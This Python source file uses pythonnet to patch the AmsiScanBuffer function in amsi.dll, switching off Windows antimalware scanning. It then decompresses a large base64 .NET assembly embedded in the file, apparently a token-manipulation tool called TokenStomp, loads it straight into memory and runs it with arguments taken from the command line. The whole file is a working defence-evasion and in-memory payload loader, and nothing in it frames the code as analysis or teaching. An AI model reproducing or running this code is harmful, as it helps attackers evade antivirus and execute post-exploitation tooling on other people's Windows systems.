import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("TokenStomp.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()